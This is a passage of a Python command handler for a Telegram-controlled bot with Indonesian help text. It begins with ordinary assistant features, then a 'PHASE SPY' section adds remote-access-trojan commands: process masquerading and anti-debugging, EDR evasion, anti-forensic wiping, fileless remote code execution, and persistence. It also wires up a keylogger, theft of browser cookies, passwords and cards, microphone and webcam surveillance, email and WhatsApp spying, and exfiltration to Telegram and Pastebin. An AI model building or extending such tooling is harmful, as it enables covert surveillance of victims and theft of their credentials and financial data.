            query = " ".join(args[1:])
            return memory_manager.forget(query)
        elif sub == "stats":
            stats = memory_manager.stats()
            return (
                f"📊 *Memory Stats*\n"
                f"Total entries: {stats['total_entries']}\n"
                f"Topics: {', '.join(f'{t}({c})' for t, c in stats['topics'].items())}"
            )
        elif sub == "sync":
            from agent.memory.sync import MemorySync
            sync = MemorySync()
            return sync.sync_all()
        return "❌ Subperintah tidak dikenal."

    async def handle_mcp(self, args: list[str]) -> str:
        from agent.memory.mcp_collector import mcp_collector
        if not args:
            return (
                "🧠 *Memory Context Provider (MCP)*\n"
                "`!mcp on` — Aktifkan monitoring otomatis\n"
                "`!mcp off` — Nonaktifkan\n"
                "`!mcp status` — Status collector\n"
                "`!mcp query [pertanyaan]` — Tanya konteks saat ini"
            )
        sub = args[0].lower()
        if sub == "on":
            await mcp_collector.start()
            return "🟢 MCP Collector diaktifkan. Monitoring setiap 30 detik."
        elif sub == "off":
            await mcp_collector.stop()
            return "🔴 MCP Collector dinonaktifkan."
        elif sub == "status":
            return f"{'🟢 Aktif' if mcp_collector.active else '🔴 Nonaktif'}"
        elif sub == "query":
            query = " ".join(args[1:])
            context = mcp_collector.get_recent_context()
            if query:
                results = memory_manager.search(query, k=5)
                if results:
                    context += "\n\n🔍 *Memory Search:*\n" + "\n".join(
                        f"• {r['text'][:200]}" for r in results
                    )
            return context or "Tidak ada konteks tersedia."
        return "❌ Subperintah tidak dikenal."

    async def handle_companion(self, args: list[str]) -> str:
        from agent.companion import companion
        if not args:
            return "💬 Gunakan: `!companion <pesan>` untuk mengobrol dengan AI Companion."
        message = " ".join(args)
        return await companion.chat(message, "user")

    async def handle_solve(self, args: list[str]) -> str:
        from agent.solver import solver
        if not args:
            return "🔧 Gunakan: `!solve <problem>` untuk solusi masalah."
        problem = " ".join(args)
        return await solver.solve(problem)

    async def handle_create_feature(self, args: list[str]) -> str:
        from agent.self_feature import self_feature_engine
        if not args:
            return (
                "🧬 *Self-Feature Generation*\n"
                "`!create feature <deskripsi>` — Buat fitur baru dari AI\n"
                "`!create list` — Lihat fitur kustom terinstal"
            )
        if args[0].lower() == "list":
            features = self_feature_engine.list_features()
            if not features:
                return "Belum ada fitur kustom yang dibuat."
            lines = ["🧬 *Fitur Kustom Terinstal:*"]
            for f in features:
                lines.append(f"• `!{f['name']}` — {f['description']} ({f['installed_at'][:10]})")
            return "\n".join(lines)
        description = " ".join(args)
        result = await self_feature_engine.generate_feature(description)
        if "error" in result:
            return f"❌ {result['error']}"
        feature_name = result["feature_name"]
        return (
            f"🧬 *Generate Fitur Baru: `!{feature_name}`*\n\n"
            f"Deskripsi: {result.get('description', '-')}\n"
            f"Dependensi: {', '.join(result.get('dependencies', [])) or 'tidak ada'}\n\n"
            f"⚠️ Akan memodifikasi: command_handler.py, command_router.py, allowed_commands.yaml, fallback_parser.py\n\n"
            f"Ketik `!create confirm {feature_name}` untuk melanjutkan,\n"
            f"atau `!create cancel` untuk membatalkan."
        )

    async def handle_self_evolve(self, args: list[str]) -> str:
        from agent.evolution import evolution_engine
        if not args:
            return (
                "🧬 *Self-Evolution Engine*\n"
                "`!self evolve` — Jalankan evolusi sekarang\n"
                "`!self evolve history` — Lihat riwayat evolusi\n"
                "`!self evolve auto` — Jadwalkan otomatis setiap malam"
            )
        sub = args[0].lower()
        if sub == "history":
            days = int(args[1]) if len(args) > 1 and args[1].isdigit() else 7
            return evolution_engine.get_history(days)
        elif sub == "auto":
            from agent.scheduler import scheduler
            scheduler.add_schedule("daily at 00:00 !self evolve")
            return "🕛 Self-evolution dijadwalkan otomatis setiap tengah malam."
        return await evolution_engine.run_evolution()

    async def handle_optimize_me(self, args: list[str]) -> str:
        from agent.optimizer import optimizer
        return await optimizer.generate_advice()

    async def handle_proactive(self, args: list[str]) -> str:
        from agent.proactive import proactive_engine
        if not args:
            return (
                "🔔 *Proactive Mode*\n"
                "`!proactive on` — Aktifkan notifikasi proaktif\n"
                "`!proactive off` — Nonaktifkan\n"
                "`!proactive status` — Status saat ini"
            )
        sub = args[0].lower()
        if sub == "on":
            await proactive_engine.start()
            return "🔔 Proactive mode diaktifkan."
        elif sub == "off":
            await proactive_engine.stop()
            return "🔕 Proactive mode dinonaktifkan."
        elif sub == "status":
            return f"{'🔔 Aktif' if proactive_engine.active else '🔕 Nonaktif'}"
        return "❌ Subperintah tidak dikenal."

    async def handle_learn(self, args: list[str]) -> str:
        from agent.knowledge import knowledge_engine
        if not args:
            return (
                "📚 *Knowledge Enrichment*\n"
                "`!learn <topik>` — Cari dan simpen artikel tentang topik\n"
                "`!learn list` — Lihat topik yang sudah dipelajari"
            )
        if args[0].lower() == "list":
            return knowledge_engine.list_topics()
        topic = " ".join(args)
        return await knowledge_engine.learn(topic)

    async def handle_agent_mode(self, args: list[str]) -> str:
        from agent.autonomous_agent import autonomous_agent
        if not args:
            return (
                "🤖 *Autonomous Agent Mode*\n"
                "`!agent <goal>` — Jalankan agent untuk goal kompleks\n"
                "`!agent stop` — Hentikan agent yang sedang berjalan\n\n"
                "Agent akan membuat rencana, eksekusi langkah demi langkah, "
                "dan melaporkan progress ke Telegram."
            )
        if args[0].lower() == "stop":
            autonomous_agent.stop()
            return "⏹️ Agent dihentikan."
        goal = " ".join(args)

        # Beri akses ke router biar agent bisa eksekusi command
        try:
            from bot.command_router import CommandRouter
            router = CommandRouter()
        except Exception:
            router = None

        return await autonomous_agent.run(goal, "user", router=router, handler=self)

    async def handle_ai_agent(self, args: list[str]) -> str:
        from agent.ai_agent import run_agent, get_history, clear_history
        if not args:
            return "Gunakan: !ai agent <task> atau !ai agent [history|clear]"
        subcmd = args[0].lower()
        if subcmd in ("history", "histori"):
            return get_history()
        elif subcmd in ("clear", "bersih"):
            return clear_history()
        task = " ".join(args)
        return await run_agent(task)

    async def handle_internet_brain(self, args: list[str]) -> str:
        from agent.internet_brain import internet_brain
        if not args:
            return (
                "🧠 *Internet Brain*\n"
                "`!internet_brain <query>` — Jawab pertanyaan dengan pengetahuan internet\n"
                "`!otak_internet <query>` — Alias Indonesia"
            )
        query = " ".join(args)
        return await internet_brain.answer(query)

    async def handle_live_web(self, args: list[str]) -> str:
        from agent.live_web import live_web
        if not args:
            return (
                "🌐 *Live Web*\n"
                "`!live_web <query>` — Cari informasi real-time dari internet\n"
                "`!web_langsung <query>` — Alias Indonesia"
            )
        query = " ".join(args)
        return await live_web.search(query)

    async def handle_deep_scrape(self, args: list[str]) -> str:
        from agent.deep_scrape import deep_scraper
        if not args:
            return (
                "🔍 *Deep Scrape*\n"
                "`!deep_scrape <url> [task]` — Analisis mendalam halaman web\n"
                "`!scrape_dalam <url> [task]` — Alias Indonesia"
            )
        url = args[0]
        task = " ".join(args[1:]) if len(args) > 1 else ""
        return await deep_scraper.analyze(url, task)

    async def handle_research(self, args: list[str]) -> str:
        from agent.research import research_engine
        if not args:
            return (
                "📚 *Research Engine*\n"
                "`!research <topik> [light|medium|deep]` — Riset komprehensif\n"
                "`!riset <topik> [ringan|sedang|mendalam]` — Alias Indonesia"
            )
        topic = " ".join(args)
        depth = "medium"
        if args[-1].lower() in ("light", "ringan"):
            depth = "light"
            topic = " ".join(args[:-1])
        elif args[-1].lower() in ("medium", "sedang"):
            depth = "medium"
            topic = " ".join(args[:-1])
        elif args[-1].lower() in ("deep", "mendalam"):
            depth = "deep"
            topic = " ".join(args[:-1])
        if not topic.strip():
            return "❌ Masukkan topik riset."
        return await research_engine.research(topic, depth)

    async def handle_verify_fact(self, args: list[str]) -> str:
        from agent.fact_checker import fact_checker
        if not args:
            return (
                "✅ *Fact Checker*\n"
                "`!verify_fact <pernyataan>` — Verifikasi kebenaran informasi\n"
                "`!cek_fakta <pernyataan>` — Alias Indonesia"
            )
        claim = " ".join(args)
        return await fact_checker.verify(claim)

    async def handle_news_digest(self, args: list[str]) -> str:
        from agent.news_digest import news_digest
        if not args:
            return (
                "📰 *News Digest*\n"
                "`!news_digest <topik>` — Ringkasan berita terkini\n"
                "`!ringkasan_berita <topik>` — Alias Indonesia"
            )
        topic = " ".join(args)
        return await news_digest.digest(topic)

    async def handle_trend_hunter(self, args: list[str]) -> str:
        from agent.trend_hunter import trend_hunter
        if not args:
            return (
                "🔥 *Trend Hunter*\n"
                "`!trend_hunter <topik>` — Identifikasi tren terbaru\n"
                "`!pemburu_tren <topik>` — Alias Indonesia"
            )
        topic = " ".join(args)
        return await trend_hunter.hunt(topic)

    async def handle_comparator(self, args: list[str]) -> str:
        from agent.comparator import comparator
        if not args:
            return (
                "⚖️ *Comparator*\n"
                "`!comparator <item A> vs <item B>` — Bandingkan dua item\n"
                "`!pembanding <item A> vs <item B>` — Alias Indonesia\n"
                "Contoh: `!comparator RTX 4060 vs RTX 4070`"
            )
        text = " ".join(args)
        if " vs " in text:
            parts = text.split(" vs ", 1)
            return await comparator.compare(parts[0].strip(), parts[1].strip())
        return await comparator.compare(text)

    async def handle_qna(self, args: list[str]) -> str:
        from agent.qna import qna_engine
        if not args:
            return (
                "📚 *Advanced Q&A*\n"
                "`!qna <pertanyaan>` — Tanya jawab dengan konteks memory + web\n"
                "`!tanya <pertanyaan>` — Alias Indonesia"
            )
        return await qna_engine.answer(" ".join(args))

    async def handle_generate_image(self, args: list[str]) -> str:
        from agent.generate_image import image_generator
        if not args:
            return (
                "🎨 *Generate Image*\n"
                "`!generate_image <deskripsi>` — Generate prompt & deskripsi gambar\n"
                "`!gambar <deskripsi>` — Alias Indonesia"
            )
        return await image_generator.generate(" ".join(args))

    async def handle_translate(self, args: list[str]) -> str:
        from agent.translate import translator
        if not args:
            return (
                "🌐 *Translator*\n"
                "`!translate <teks>` — Terjemahkan teks ke Indonesia\n"
                "`!terjemah <teks>` — Alias Indonesia\n"
                "Gunakan: `!translate <teks> ke <bahasa>` untuk target tertentu"
            )
        text = " ".join(args)
        target_lang = "Indonesia"
        if " ke " in text:
            parts = text.split(" ke ", 1)
            text = parts[0].strip()
            target_lang = parts[1].strip()
        return await translator.translate(text, target_lang=target_lang)

    async def handle_explain(self, args: list[str]) -> str:
        from agent.explain import explainer
        if not args:
            return (
                "📖 *Explainer*\n"
                "`!explain <konsep> [basic|medium|advanced]` — Jelaskan konsep\n"
                "`!jelaskan <konsep> [dasar|menengah|lanjutan]` — Alias Indonesia"
            )
        topic = " ".join(args)
        level = "medium"
        level_map = {"basic": "basic", "dasar": "basic", "medium": "medium", "menengah": "medium", "advanced": "advanced", "lanjutan": "advanced"}
        last = args[-1].lower()
        if last in level_map:
            level = level_map[last]
            topic = " ".join(args[:-1])
        if not topic.strip():
            return "❌ Masukkan konsep yang akan dijelaskan."
        return await explainer.explain(topic, level)

    async def handle_proactive_suggest(self, args: list[str]) -> str:
        from agent.proactive_suggest import proactive_suggester
        context = " ".join(args) if args else ""
        return await proactive_suggester.suggest(context)

    # ═══════════════════════════════════════════════════════════════
    # PHASE SPY: Stealth & Surveillance Features
    # ═══════════════════════════════════════════════════════════════

    async def handle_stealth(self, args: list[str]) -> str:
        from agent.stealth import activate as basic_activate, deactivate as basic_deactivate, status as basic_status

        def _help() -> str:
            return (
                "🕵️ *Stealth Mode*\n"
                "`!stealth on` — Basic stealth (masquerade as dbus-daemon)\n"
                "`!stealth off` — Nonaktifkan basic stealth\n"
                "`!stealth status` — Cek status stealth\n"
                "`!stealth masquerade [name]` — Masquerade process name + argv[0]\n"
                "`!stealth harden` — Anti-debug: dumpable=0, ptrace=block\n"
                "`!stealth detect` — Scan EDR/AV + sandbox detection\n"
                "`!stealth clean [aggressive]` — Anti-forensic: clear traces\n"
                "`!stealth fileless python|shell|url <code/url>` — Memory-only execution\n"
            )

        if not args:
            return _help()
        cmd = args[0].lower()

        if cmd == "on":
            return basic_activate()
        elif cmd == "off":
            return basic_deactivate()
        elif cmd == "status":
            basic = basic_status()
            try:
                from agent.stealth_advanced import full_status
                adv = "\n" + full_status()
            except Exception:
                adv = ""
            return basic + adv

        elif cmd == "masquerade":
            from agent.stealth_advanced import masquerade_process
            name = args[1] if len(args) > 1 else "dbus-daemon"
            return masquerade_process(name)

        elif cmd == "harden":
            from agent.stealth_advanced import harden
            return harden()

        elif cmd == "detect":
            from agent.stealth_advanced import detect_report
            return detect_report()

        elif cmd == "clean":
            from agent.anti_forensic import deep_wipe
            aggressive = len(args) > 1 and args[1].lower() in ("aggressive", "yes", "y")
            return deep_wipe(aggressive)

        elif cmd == "fileless":
            from agent.stealth_advanced import fileless_run_python, fileless_run_shell, fileless_download_and_run
            if len(args) < 2:
                return "Gunakan: !stealth fileless python|shell|url <code/url>"
            mode = args[1].lower()
            payload = " ".join(args[2:])
            if not payload:
                return "Payload kosong."
            if mode == "python":
                return await asyncio.to_thread(fileless_run_python, payload)
            elif mode == "shell":
                return await asyncio.to_thread(fileless_run_shell, payload)
            elif mode == "url":
                return await asyncio.to_thread(fileless_download_and_run, payload)
            return "Mode: python|shell|url"

        return _help()

    async def handle_persistence(self, args: list[str]) -> str:
        from agent.persistence import install, remove, status
        if not args:
            return (
                "🔗 *Persistence*\n"
                "`!persistence install [method]` — Install persistence\n"
                "`!persistence remove [method]` — Hapus persistence\n"
                "`!persistence status` — Cek status persistence\n"
                "Method: systemd, crontab, autostart, bashrc, all"
            )
        cmd = args[0].lower()
        if cmd == "install":
            method = args[1] if len(args) > 1 else "all"
            return install(method)
        elif cmd == "remove":
            method = args[1] if len(args) > 1 else "all"
            return remove(method)
        elif cmd == "status":
            return status()
        return "Gunakan: !persistence install|remove|status"

    async def handle_self_destruct(self, args: list[str]) -> str:
        from agent.self_destruct import panic, self_destruct
        from agent.anti_forensic import wipe_everything
        if not args:
            return (
                "💀 *Self Destruct*\n"
                "`!self_destruct panic` — Emergency: clear clipboard, hide windows, mute\n"
                "`!self_destruct run [keep_config]` — Hapus semua jejak (logs, cache, history, persistence)\n"
                "`!self_destruct deep` — Deep wipe: + browser data, trash, thumbnails, DNS cache\n"
                "⚠️  Perintah ini menghapus logs dan konfigurasi!"
            )
        cmd = args[0].lower()
        if cmd == "panic":
            return panic()
        elif cmd == "run":
            keep = len(args) > 1 and args[1].lower() == "keep_config"
            return self_destruct(keep_config=keep)
        elif cmd == "deep":
            keep = len(args) > 1 and args[1].lower() == "keep_config"
            return wipe_everything(keep_persistence=keep)
        return "Gunakan: !self_destruct panic|run|deep"

    async def handle_arp(self, args: list[str]) -> str:
        from agent.network_recon import arp_table
        return arp_table()

    async def handle_routing(self, args: list[str]) -> str:
        from agent.network_recon import routing_table
        return routing_table()

    async def handle_dns_info(self, args: list[str]) -> str:
        from agent.network_recon import dns_info
        return dns_info()

    async def handle_net_recon(self, args: list[str]) -> str:
        from agent.network_recon import full_recon
        return full_recon()

    async def handle_wifi_surveillance(self, args: list[str]) -> str:
        from agent.wifi_surveillance import scan, known_networks, tracking
        if not args:
            return (
                "📡 *Wi-Fi Surveillance*\n"
                "`!wifi_surveillance scan` — Scan jaringan Wi-Fi sekitar\n"
                "`!wifi_surveillance known` — Lihat known networks\n"
                "`!wifi_surveillance track` — Simpan snapshot Wi-Fi"
            )
        cmd = args[0].lower()
        if cmd == "scan":
            return scan()
        elif cmd == "known":
            return known_networks()
        elif cmd == "track":
            return tracking(True)
        return "Gunakan: !wifi_surveillance scan|known|track"

    async def handle_connections(self, args: list[str]) -> str:
        from agent.connection_logger import snapshot, start, stop, export as conn_export
        if not args:
            return (
                "🔌 *Connection Logger*\n"
                "`!connections` — Snapshot koneksi TCP aktif\n"
                "`!connections start [interval]` — Mulai logging background\n"
                "`!connections stop` — Hentikan logging\n"
                "`!connections export` — Statistik log"
            )
        cmd = args[0].lower()
        if cmd == "start":
            interval = int(args[1]) if len(args) > 1 else 60
            return await start(interval)
        elif cmd == "stop":
            return await stop()
        elif cmd == "export":
            return conn_export()
        else:
            return snapshot()

    async def handle_keylogger(self, args: list[str]) -> str:
        from agent.keylogger import start, stop, status as kl_status, export as kl_export, stats as kl_stats
        if not args:
            return (
                "⌨️ *Keylogger*\n"
                "`!keylogger start` — Mulai keylogging\n"
                "`!keylogger stop` — Hentikan keylogging\n"
                "`!keylogger status` — Cek status\n"
                "`!keylogger export [decrypt]` — Export data keylog\n"
                "`!keylogger stats` — Statistik keylog"
            )
        cmd = args[0].lower()
        if cmd == "start":
            return start()
        elif cmd == "stop":
            return stop()
        elif cmd == "status":
            return kl_status()
        elif cmd == "export":
            decrypt = len(args) > 1 and args[1].lower() == "decrypt"
            return kl_export(decrypt=decrypt)
        elif cmd == "stats":
            return kl_stats()
        return "Gunakan: !keylogger start|stop|status|export|stats"

    async def handle_browser_history(self, args: list[str]) -> str:
        from agent.browser_spy import history, bookmarks, downloads
        if not args:
            return (
                "🌐 *Browser Spy*\n"
                "`!browser_history history [limit] [since_hours]` — Riwayat browsing\n"
                "`!browser_history bookmarks` — Bookmark tersimpan\n"
                "`!browser_history downloads [limit]` — Riwayat download"
            )
        cmd = args[0].lower()
        if cmd == "history":
            limit = int(args[1]) if len(args) > 1 else 30
            since = int(args[2]) if len(args) > 2 else 0
            return history(limit=limit, since_hours=since)
        elif cmd == "bookmarks":
            return bookmarks()
        elif cmd == "downloads":
            limit = int(args[1]) if len(args) > 1 else 20
            return downloads(limit=limit)
        return "Gunakan: !browser_history history|bookmarks|downloads"

    async def handle_browser_stealer(self, args: list[str]) -> str:
        from agent.browser_stealer import steal_all, steal_cookies, steal_passwords, format_steal_report
        if not args:
            return (
                "💀 *Browser Stealer*\n"
                "`!steal all` — Semua data (cookies + passwords + cards + autofill + extensions)\n"
                "`!steal cookies` — Cookie session dari Chrome/Firefox\n"
                "`!steal passwords` — Saved passwords\n"
                "`!steal cards` — Credit cards\n"
                "`!steal autofill` — Autofill data\n"
                "`!steal addresses` — Saved addresses\n"
                "`!steal extensions` — Installed extensions\n"
                "`!steal sessions` — Session files\n"
                "`!steal profiles` — Detected browser profiles"
            )
        cmd = args[0].lower()
        if cmd == "all":
            data = await asyncio.to_thread(steal_all)
            return format_steal_report(data, "all")
        elif cmd == "cookies":
            data = await asyncio.to_thread(steal_cookies)
            return format_steal_report({"cookies": data}, "cookies")
        elif cmd == "passwords":
            data = await asyncio.to_thread(steal_passwords)
            return format_steal_report({"passwords": data}, "passwords")
        elif cmd == "cards":
            data = await asyncio.to_thread(steal_all)
            return format_steal_report(data, "cards")
        elif cmd == "autofill":
            data = await asyncio.to_thread(steal_all)
            return format_steal_report(data, "autofill")
        elif cmd == "addresses":
            data = await asyncio.to_thread(steal_all)
            return format_steal_report(data, "addresses")
        elif cmd == "extensions":
            data = await asyncio.to_thread(steal_all)
            return format_steal_report(data, "extensions")
        elif cmd == "sessions":
            data = await asyncio.to_thread(steal_all)
            return format_steal_report(data, "sessions")
        elif cmd == "profiles":
            data = await asyncio.to_thread(steal_all)
            return format_steal_report(data, "profiles")
        return "Gunakan: !steal all|cookies|passwords|cards|autofill|addresses|extensions|sessions|profiles"

    async def handle_social_spy(self, args: list[str]) -> str:
        from agent.social_spy import detect_social, track, report
        if not args:
            return (
                "👁️ *Social Spy*\n"
                "`!social_spy detect` — Deteksi social media di window aktif\n"
                "`!social_spy track` — Catat aktivitas social media\n"
                "`!social_spy report [hours]` — Laporan aktivitas social media"
            )
        cmd = args[0].lower()
        if cmd == "detect":
            return detect_social()
        elif cmd == "track":
            return track()
        elif cmd == "report":
            hours = int(args[1]) if len(args) > 1 else 24
            return report(hours=hours)
        return "Gunakan: !social_spy detect|track|report"

    async def handle_email_spy(self, args: list[str]) -> str:
        from agent.email_spy import recent, contacts
        if not args:
            return (
                "📧 *Email Spy*\n"
                "`!email_spy recent [limit] [source]` — Email terbaru\n"
                "`!email_spy contacts` — Kontak dari address book\n"
                "Source: thunderbird (default), evolution"
            )
        cmd = args[0].lower()
        if cmd == "recent":
            limit = int(args[1]) if len(args) > 1 else 10
            source = args[2] if len(args) > 2 else "thunderbird"
            return recent(limit=limit, source=source)
        elif cmd == "contacts":
            return contacts()
        return "Gunakan: !email_spy recent|contacts"

    async def handle_audio_surveillance(self, args: list[str]) -> str:
        from agent.audio_surveillance import listen, ambient_start, ambient_stop, ambient_status
        if not args:
            return (
                "🎤 *Audio Surveillance*\n"
                "`!audio_surveillance listen [seconds]` — Rekam mikrofon\n"
                "`!audio_surveillance ambient_start [duration] [threshold]` — Monitoring ambient\n"
                "`!audio_surveillance ambient_stop` — Hentikan ambient monitoring\n"
                "`!audio_surveillance ambient_status` — Status ambient monitoring"
            )
        cmd = args[0].lower()
        if cmd == "listen":
            seconds = int(args[1]) if len(args) > 1 else 10
            return listen(seconds)
        elif cmd == "ambient_start":
            duration = int(args[1]) if len(args) > 1 else 300
            threshold = int(args[2]) if len(args) > 2 else 300
            return await ambient_start(duration=duration, threshold=threshold)
        elif cmd == "ambient_stop":
            return ambient_stop()
        elif cmd == "ambient_status":
            return ambient_status()
        return "Gunakan: !audio_surveillance listen|ambient_start|ambient_stop|ambient_status"

    async def handle_webcam_surveillance(self, args: list[str]) -> str:
        from agent.webcam_surveillance import motion_start, motion_stop, interval_start, interval_stop
        if not args:
            return (
                "📷 *Webcam Surveillance*\n"
                "`!webcam_surveillance motion_start [sensitivity]` — Deteksi gerakan\n"
                "`!webcam_surveillance motion_stop` — Hentikan deteksi gerakan\n"
                "`!webcam_surveillance interval_start [seconds] [count]` — Capture interval\n"
                "`!webcam_surveillance interval_stop` — Hentikan interval capture"
            )
        cmd = args[0].lower()
        if cmd == "motion_start":
            sensitivity = int(args[1]) if len(args) > 1 else 5
            return await motion_start(sensitivity=sensitivity)
        elif cmd == "motion_stop":
            return await motion_stop()
        elif cmd == "interval_start":
            seconds = int(args[1]) if len(args) > 1 else 10
            count = int(args[2]) if len(args) > 2 else 10
            return await interval_start(seconds=seconds, count=count)
        elif cmd == "interval_stop":
            return await interval_stop()
        return "Gunakan: !webcam_surveillance motion_start|motion_stop|interval_start|interval_stop"

    async def handle_collect(self, args: list[str]) -> str:
        from agent.data_exfil import collect, package
        if not args:
            return (
                "📦 *Data Collection*\n"
                "`!collect auto` — Kumpulkan intel sistem\n"
                "`!collect history` — Riwayat browsing\n"
                "`!collect screenshots` — Screenshot terbaru\n"
                "`!collect package <target>` — Kumpulkan + package jadi tar.gz"
            )
        target = args[0].lower()
        if target == "package" and len(args) > 1:
            data = await collect(args[1])
            if isinstance(data, dict):
                return await package(data)
            return str(data)
        data = await collect(target)
        if isinstance(data, str):
            return data
        import json
        return json.dumps(data, indent=2, default=str)[:2000]

    async def handle_exfil(self, args: list[str]) -> str:
        from agent.exfil_channels import via_telegram, via_pastebin
        if not args:
            return (
                "📤 *Exfiltration*\n"
                "`!exfil telegram <file_path> [caption]` — Kirim file via Telegram\n"
                "`!exfil pastebin <content> [title]` — Upload ke Pastebin"
            )
        cmd = args[0].lower()
        if cmd == "telegram" and len(args) > 1:
            file_path = args[1]
            caption = " ".join(args[2:]) if len(args) > 2 else ""
            return await via_telegram(file_path, caption)
        elif cmd == "pastebin" and len(args) > 1:
            content = args[1]
            title = " ".join(args[2:]) if len(args) > 2 else "RAV-SPY Data"
            return await via_pastebin(content, title)
        return "Gunakan: !exfil telegram <file_path> [caption] | pastebin <content> [title]"

    async def handle_intel(self, args: list[str]) -> str:
        from agent.ai_recon import full, user_behavior
        if not args:
            return (
                "🧠 *AI Intel*\n"
                "`!intel full` — Laporan intelijen komprehensif\n"
                "`!intel behavior` — Analisis perilaku pengguna"
            )
        cmd = args[0].lower()
        if cmd == "full":
            return await full()
        elif cmd == "behavior":
            return await user_behavior()
        return "Gunakan: !intel full|behavior"

    async def handle_alert(self, args: list[str]) -> str:
        from agent.smart_alert import config_set, config_get, config_delete, silence
        if not args:
            return (
                "🔔 *Smart Alert*\n"
                "`!alert set <key> <value>` — Set alert\n"
                "`!alert get [key]` — Lihat konfigurasi alert\n"
                "`!alert delete <key>` — Hapus alert\n"
                "`!alert silence [seconds]` — Silence alert sementara"
            )
        cmd = args[0].lower()
        if cmd == "set" and len(args) >= 3:
            return config_set(args[1], " ".join(args[2:]))
        elif cmd == "get":
            key = args[1] if len(args) > 1 else None
            return config_get(key)
        elif cmd == "delete" and len(args) > 1:
            return config_delete(args[1])
        elif cmd == "silence":
            seconds = int(args[1]) if len(args) > 1 else 300
            return silence(seconds)
        return "Gunakan: !alert set|get|delete|silence"

    async def handle_wa(self, args: list[str]) -> str:
        from agent.whatsapp_spy import (
            check, monitor_start, monitor_stop, monitor_stop_all, monitor_list,
            session_status, reset as wa_reset, scan as wa_scan,
            get_messages, get_groups, send_message, forward_chat,
            reply_message, react_message, send_media, mark_read,
            typing_indicator, delete_message,
            group_add, group_remove, group_promote, group_demote,
            group_subject, group_desc, group_invite, group_leave, group_members,
            get_contacts, block_contact, unblock_contact, get_profile,
        )
        if not args:
            return (
                "💬 *WhatsApp Spy*\n"
                "`!wa scan` — Tampilkan QR pairing\n"
                "`!wa check <nomor>` — Cek status online/offline\n"
                "`!wa monitor <nomor> [interval]` — Monitor background\n"
                "`!wa stop <nomor>` — Hentikan monitor\n"
                "`!wa stop_all` — Hentikan semua monitor\n"
                "`!wa list` — Monitor aktif\n"
                "`!wa status` — Status koneksi\n"
                "`!wa reset` — Reset pairing\n"
                "`!wa messages <nomor> [limit]` — Riwayat pesan\n"
                "`!wa groups` — Daftar grup\n"
                "`!wa send <nomor> <teks>` — Kirim pesan teks\n"
                "`!wa send_media <nomor> <file> [image/video/audio/document] [caption]` — Kirim media\n"
                "`!wa reply <nomor> <id_pesan> <teks>` — Balas pesan spesifik\n"
                "`!wa react <nomor> <id_pesan> [emoji]` — Reaksi pesan\n"
                "`!wa read <nomor> [id_pesan]` — Tandai sudah dibaca\n"
                "`!wa typing <nomor> on/off/recording` — Indikator mengetik\n"
                "`!wa delete <nomor> <id_pesan>` — Hapus pesan\n"
                "`!wa contacts` — Daftar kontak\n"
                "`!wa block <nomor>` — Blokir kontak\n"
                "`!wa unblock <nomor>` — Buka blokir\n"
                "`!wa profile <nomor>` — Foto profil + status\n"
                "`!wa forward <on/off/status> [nomor]` — Forward pesan otomatis ke Telegram\n"
                "`!wa group_add <grup_id> <nomor1> [nomor2...]` — Tambah anggota grup\n"
                "`!wa group_remove <grup_id> <nomor1> [nomor2...]` — Keluarkan anggota\n"
                "`!wa group_promote <grup_id> <nomor1> [nomor2...]` — Jadikan admin\n"
                "`!wa group_demote <grup_id> <nomor1> [nomor2...]` — Turunkan admin\n"
                "`!wa group_subject <grup_id> <nama>` — Ubah nama grup\n"
                "`!wa group_desc <grup_id> <deskripsi>` — Ubah deskripsi grup\n"
                "`!wa group_invite <grup_id>` — Link undangan grup\n"
                "`!wa group_members <grup_id>` — Daftar anggota grup\n"
                "`!wa group_leave <grup_id>` — Keluar dari grup\n\n"
                "Contoh: !wa messages 6281234567890 10"
            )
        cmd = args[0].lower()
        if cmd == "check" and len(args) > 1:
            return await check(args[1])
        elif cmd == "monitor" and len(args) > 1:
            interval = int(args[2]) if len(args) > 2 else 60
            return await monitor_start(args[1], interval)
        elif cmd == "stop" and len(args) > 1:
            return await monitor_stop(args[1])
        elif cmd == "stop_all":
            return await monitor_stop_all()
        elif cmd == "list":
            return monitor_list()
        elif cmd == "status":
            return await session_status()
        elif cmd == "scan":
            return await wa_scan()
        elif cmd == "reset":
            return await wa_reset()
        elif cmd == "messages" and len(args) > 1:
            limit = int(args[2]) if len(args) > 2 else 20
            return await get_messages(args[1], limit)
        elif cmd == "groups":
            return await get_groups()
        elif cmd == "send" and len(args) > 2:
            return await send_message(args[1], " ".join(args[2:]))
        elif cmd == "reply" and len(args) > 2:
            quoted = " ".join(args[3:]) if len(args) > 3 else ""
            return await reply_message(args[1], args[2], quoted)
        elif cmd == "react" and len(args) > 2:
            emoji = args[2] if len(args) > 2 else "👍"
            return await react_message(args[1], args[2], emoji)
        elif cmd == "send_media" and len(args) > 2:
            mtype = args[2] if len(args) > 2 else "image"
            caption = " ".join(args[3:]) if len(args) > 3 else ""
            return await send_media(args[1], mtype, caption)
        elif cmd == "read" and len(args) > 1:
            msg_id = args[1] if len(args) > 2 else None
            return await mark_read(args[1], msg_id)
        elif cmd == "typing" and len(args) > 2:
            return await typing_indicator(args[1], args[2])
        elif cmd == "delete" and len(args) > 2:
            return await delete_message(args[1], args[2])
        elif cmd == "contacts":
            return await get_contacts()
        elif cmd == "block" and len(args) > 1:
            return await block_contact(args[1])
        elif cmd == "unblock" and len(args) > 1:
            return await unblock_contact(args[1])
        elif cmd == "profile" and len(args) > 1:
            return await get_profile(args[1])
        elif cmd == "forward":
            action = args[1] if len(args) > 1 else "status"
            phone = args[2] if len(args) > 2 else None
            return await forward_chat(phone, action)
        elif cmd == "group_add" and len(args) > 2:
            return await group_add(args[1], args[2:])
        elif cmd == "group_remove" and len(args) > 2:
            return await group_remove(args[1], args[2:])
        elif cmd == "group_promote" and len(args) > 2:
            return await group_promote(args[1], args[2:])
        elif cmd == "group_demote" and len(args) > 2:
            return await group_demote(args[1], args[2:])
        elif cmd == "group_subject" and len(args) > 2:
            return await group_subject(args[1], " ".join(args[2:]))
        elif cmd == "group_desc" and len(args) > 2:
            return await group_desc(args[1], " ".join(args[2:]))
        elif cmd == "group_invite" and len(args) > 1:
            return await group_invite(args[1])
        elif cmd == "group_members" and len(args) > 1:
            return await group_members(args[1])
        elif cmd == "group_leave" and len(args) > 1:
            return await group_leave(args[1])
        return "Gunakan: !wa scan|check|monitor|stop|list|status|reset|messages|groups|send|reply|react|send_media|read|typing|delete|contacts|block|unblock|profile|forward|group_*"

